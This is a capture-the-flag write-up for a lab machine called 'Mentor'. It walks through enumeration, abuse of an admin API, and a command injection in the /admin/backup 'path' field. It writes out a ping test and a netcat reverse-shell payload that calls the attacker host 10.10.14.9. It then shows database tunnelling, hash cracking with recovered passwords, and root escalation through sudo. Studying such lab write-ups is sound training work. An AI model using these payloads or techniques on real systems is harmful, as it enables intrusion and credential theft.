<h2>Target: 10.10.11.193	Mentor </h2>

<b>Initial Access:</b><br>
nmap -Pn --min-rate=5000 10.10.11.193 -p-|grep open|awk -F / '{print $1}'|tr '\n' ',' <br>
The output shows open ports: 22,80

Enumerate these open ports further with nmap: <br>
nmap -Pn --min-rate=5000 10.10.11.193 -p 22,80 -sC -sV -oN nmap.mentor
 
![image](https://user-images.githubusercontent.com/93153300/213529199-8cea3451-e8a2-48e2-a99d-b16562fd8b75.png)
nmap shows port 80 redirects to mentorquotes.htb.  Add this into /etc/hosts:  <br>
10.10.11.193   mentorquotes.htb

Visiting port 80 shows nothing of interest.  Directory brute force finds nothing of interest.   Run subdomain brute force: <br>
wfuzz -c -w /usr/share/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -H "Host: FUZZ.mentorquotes.htb" -u "http://mentorquotes.htb/" --hl 9

wfuzz finds a subdomain of ‘api’.  Add this into /etc/hosts: <br>
10.10.11.193 mentorquotes.htb api.mentorquotes.htb

Visiting http://api.mentorquotes.htb shows nothing of interest.  Run directory brute force: <br>
dirsearch -r -u http://api.mentorquotes.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -o dsearch.txt

Dirsearch found: <br>
http://api.mentorquotes.htb/users/ <br>
http://api.mentorquotes.htb/admin/ <br>
http://api.mentorquotes.htb/quotes/ <br>
http://api.mentorquotes.htb/redoc <br>
http://api.mentorquotes.htb/docs

Further directory brute force on the api with feroxbuster: <br>
feroxbuster -r -u http://api.mentorquotes.htb/admin -w  /usr/share/seclists/Discovery/Web-Content/common.txt -o fbuster.txt --force-recursion --dont-filter  --no-state -s 200 204 301 302 307 308 401 403 405 500 -X POST

Feroxbuster found: http://api.mentorquotes.htb/admin/backup

feroxbuster -r -u http://api.mentorquotes.htb/users -w  /usr/share/seclists/Discovery/Web-Content/common.txt -o ~/Downloads/fbuster.api.bw --force-recursion --dont-filter  --no-state -s 200 204 301 302 307 308 401 403 405 500 -X GET

Feroxbuster found: http://api.mentorquotes.htb/users/add

To summarize the directory brute force findings: <br>
http://api.mentorquotes.htb/users/ --> http://api.mentorquotes.htb/users/add <br>
http://api.mentorquotes.htb/admin/ --> http://api.mentorquotes.htb/admin/backup <br>
http://api.mentorquotes.htb/quotes/ <br>
http://api.mentorquotes.htb/redoc <br>
http://api.mentorquotes.htb/docs

Visitng http://api.mentorquotes.htb/docs shows:
 
![image](https://user-images.githubusercontent.com/93153300/213529262-2be655ad-af38-4194-ac36-9141b552cf29.png)
  
Use this site to enumerate and exploit the target further.  <br>

Step 1: Create a user with ‘/auth/signup’. <br>
Step 2: Login with ‘/auth/user’.  The output returns an Authorization string. <br>
Step 3: Use the ‘/users’ on the page to see all the users.  It asks for the Authorization string.  Enter the Authorization string we got after logging in to ‘/auth/user’. The page responds that only admin is allowed access.<br>
Step 4: The top of the webpage shows user ‘james’.  User ‘james’ might be the admin.  Go back to ‘/auth/signup’ and create a user ‘james’ but put a new email for ‘james’ (anything@mentorquotes.htb). <br>
Step 5: login with ‘/auth/user’ with the credentials we created for ‘james’.  The response gives an Authorization string.  <br>
Step 6: Use ‘/users’ and enter the Authorization string we got for the user ‘james’.  It works. <br>
Step 7: Now that we know james is the admin user, go to ‘/admin/backup’, capture the request in burp suite, change the method to ‘POST’, add the header ‘Authorization: string’ for user ‘james’, add in an empty json object ‘{}’ at the end, add the header ‘Content-type: application/json’.  (Trial and error and working with the responses the site gives back led me to make these changes).  The webpage responds that it needs an attribute of ‘path’.
Step 8: Do step 7 again, but this time add in the ‘path’ attribute: {“path”:”/etc/passwd”} 
 
![image](https://user-images.githubusercontent.com/93153300/213529308-01134946-f7dc-434b-ba9a-a084b2796f6a.png)

Step 9: It works.  Try command injection by repeating step 8, but then adding to the ‘path’ attribute: “path”:”/etc/passwd;ping -c 4 10.10.14.9;”.  
 
![image](https://user-images.githubusercontent.com/93153300/213529335-ebbb1548-8ccf-4a3a-b93a-ed9ac10a8955.png)
  
Before sending the request, open tcpdump to catch the ping: tcpdump -i tun0 icmp <br>
Step 10: We get a ping back on our tcpdump.  This shows we have command injection.  Use this to get a reverse shell.  Replace the ‘path’ attribute with: “path”:"/etc/passwd;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 443 >/tmp/f;" .  Before sending the request, open a netcat listener to catch and get a shell: nc -lvnp 443 <br>
Step 11: We get shell as root in a docker.  
 
![image](https://user-images.githubusercontent.com/93153300/213529366-f80564a7-7c4e-44fb-bb02-b718e2b0c341.png)

_________________________________________________________________
<b>Docker breakout:</b><br>
File /app/app/db.py shows postgresql credentials of ‘postgres:postgres’.  
 
![image](https://user-images.githubusercontent.com/93153300/213529390-d04efadc-db7c-4a7a-b8ee-b4e0037cf60a.png)

The postgresql is not publicly accessible.  In order to connect to the postgresql database we will use chisel.  

Step 1: Upload chisel to the target docker shell.   <br>
Step 2: On our local pc run : ./chisel server -p 9999 --reverse <br>
Step 3: On the target docker shell run chisel: ./chisel client 10.10.14.9:9999 R:5432:172.22.0.1:5432 <br>
Step 4: On our local pc run: psql -h 10.10.14.9 -U postgres -p 5432 <br>

Look around the database for interesting findings: <br>
Step 1: List the databases: \list <br>
 
![image](https://user-images.githubusercontent.com/93153300/213529430-4bc31dae-1e46-4ea9-9b5b-137eed9fdf13.png)

Step 2: The response shows a database by the name of ‘mentorquotes_db’.  Connect to that database using command: \c mentorquotes_db <br>
Step 3: Show the tables for the mentorquotes_db with the command: \d <br>
 
![image](https://user-images.githubusercontent.com/93153300/213529459-3b161ae6-0856-422a-bc63-3c066690e5c5.png)

Step 4: One of the tables is called ‘users’.  Dump the ‘users’ table with command: select * from users; <br>
Step 5: Table ‘users’ contains hashes for user ‘james’ and user ‘svc’.  
 
![image](https://user-images.githubusercontent.com/93153300/213529496-b5a6a5c3-a043-45a7-8f3d-817ebf3e38c7.png)

Copy the hashes into a file (each hash on a seperate line), and find the hash type with command: nth -f hash <br>

The ‘nth’ command returned that it most likely is md5.  Crack the hashes with john: john hash --wordlist=/usr/share/wordlists/rockyou.txt –format=raw-md5 <br>      
John cracked the ‘svc’ user hash: 123meunomeeivani

ssh into the target as user svc: ssh svc@mentorquotes.htb → enter the password when prompted

We have shell as user ‘svc’.  We can get the flag in /home/svc/user.txt.
_______________________________________________________
<b>Lateral Movement:</b><br>
The file /etc/passwd shows that there is a user ‘james’.  

Upload linpeas.sh to the target and run it.  Linpeas found:
 
![image](https://user-images.githubusercontent.com/93153300/213529537-2d01923f-74cc-43b1-ac16-1d9279ddb23b.png)

On our local pc enumerate snmp with nmap.  The standard tcp nmap scan didn’t find an open snmp port, so we will try a udp nmap scan: sudo nmap -Pn --min-rate=5000 mentorquotes.htb -sU 

Nmap returned showing port 161 udp is open. <br>
Running the command ‘snmp-check 10.10.11.193’ doesn’t show anything of interest. <br>
Read the file /etc/snmp/snmpd.conf.  The file shows a password of ‘SuperSecurePassword123__’:
 
![image](https://user-images.githubusercontent.com/93153300/213529566-1b0e540f-8864-4088-ac3a-6e817a666591.png)

Check if this password works for user ‘james’: su james → enter the password when prompted.  It works, we have shell as user ‘james’.  
____________________________________
<b> Privilege Escalation:</b><br>
Run sudo -l:
 
![image](https://user-images.githubusercontent.com/93153300/213529618-de807020-283f-40b6-8a23-91c4abf386dc.png)

The command ‘sudo -l’ shows we can run a /bin/sh shell as root.  We will use this to escalate to root.  Run the command: sudo /bin/sh

We have shell as root.  We can get the flag in /root/root.txt.
